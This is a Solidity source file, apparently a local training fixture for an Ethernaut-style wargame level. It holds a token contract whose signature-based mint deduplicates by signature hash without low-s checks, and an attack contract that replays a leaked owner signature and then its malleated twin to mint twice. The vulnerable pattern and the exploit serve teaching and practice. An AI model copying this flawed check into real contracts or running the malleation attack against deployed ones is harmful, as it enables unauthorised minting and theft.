// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

// Local training fixture (Ethernaut 2025 Forger). Uses raw ecrecover to
// model OZ 4.6 ECDSA behaviour (no low-s enforcement), which the original
// level relies on for the signature-malleability replay.
contract ForgerToken {
    string public name = "Forger Token";
    string public symbol = "FT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner = 0xC9CAF9e17BBb4e4D27810d97d2C2a467A701e0D5;
    mapping(bytes32 => bool) public signatureUsed;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function createNewTokensFromOwnerSignature(
        bytes calldata signature,
        address receiver,
        uint256 amount,
        bytes32 salt,
        uint256 deadline
    ) public {
        require(block.timestamp <= deadline, "expired");
        require(!signatureUsed[keccak256(signature)], "used");

        bytes32 messageHash = keccak256(abi.encode(receiver, amount, salt, deadline));
        address signer = _recover(messageHash, signature);
        require(signer == owner, "bad signer");

        signatureUsed[keccak256(signature)] = true;
        _mint(receiver, amount);
    }

    function invalidateSignature(bytes calldata signature) external {
        require(msg.sender == owner, "only owner");
        signatureUsed[keccak256(signature)] = true;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function _recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(hash, v, r, s);
    }
}

// The owner signed a mint for: receiver 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,
// amount 100 ether, salt 0x0448..., deadline max. The signature is leaked:
// 0xf73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c
contract ForgerAttack {
    function attack(ForgerToken token) external {
        bytes memory sig = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";
        address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
        uint256 amount = 100 ether;
        bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
        uint256 deadline = type(uint256).max;

        // First mint with the original signature.
        token.createNewTokensFromOwnerSignature(sig, receiver, amount, salt, deadline);

        // Second mint with the malleated signature (r, n-s, 28): same signer,
        // different signature bytes -> different keccak256(signature) key.
        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes memory sig2 = abi.encodePacked(r, bytes32(n - uint256(s)), v == 27 ? 28 : 27);
        token.createNewTokensFromOwnerSignature(sig2, receiver, amount, salt, deadline);
    }

    function _split(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

